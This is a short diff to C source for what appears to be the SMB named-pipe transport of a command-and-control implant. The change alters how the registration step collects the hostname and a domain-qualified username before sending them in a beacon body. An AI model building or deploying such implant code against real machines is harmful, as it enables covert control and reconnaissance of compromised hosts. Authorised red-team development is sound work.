@@ -6,6 +6,9 @@
 #include <stdlib.h>
 #include <string.h>
 #include <stdio.h>
+#include <ctype.h>
+#define SECURITY_WIN32
+#include <secext.h>
 
 // Global pipe handle — opened once during register, kept for beacon/result.
 static HANDLE g_smb_pipe = INVALID_HANDLE_VALUE;
@@ -75,10 +78,13 @@ int transport_smb_register(void) {
     g_smb_pipe = open_pipe();
     if (g_smb_pipe == INVALID_HANDLE_VALUE) return 0;
 
-    char hostname[128]="UNKNOWN", username[128]="UNKNOWN";
-    DWORD hsz=sizeof(hostname), usz=sizeof(username);
+    char hostname[128]="UNKNOWN", username[256]="UNKNOWN";
+    DWORD hsz=sizeof(hostname);
     GetComputerNameA(hostname, &hsz);
-    GetUserNameA(username, &usz);
+    for (DWORD i = 0; i < hsz; i++) hostname[i] = (char)tolower((unsigned char)hostname[i]);
+    ULONG usz=sizeof(username);
+    if (!GetUserNameExA(2 /*NameSamCompatible*/, username, &usz))
+        GetUserNameA(username, (DWORD*)&usz);
 
     char body[1024];
     snprintf(body, sizeof(body),
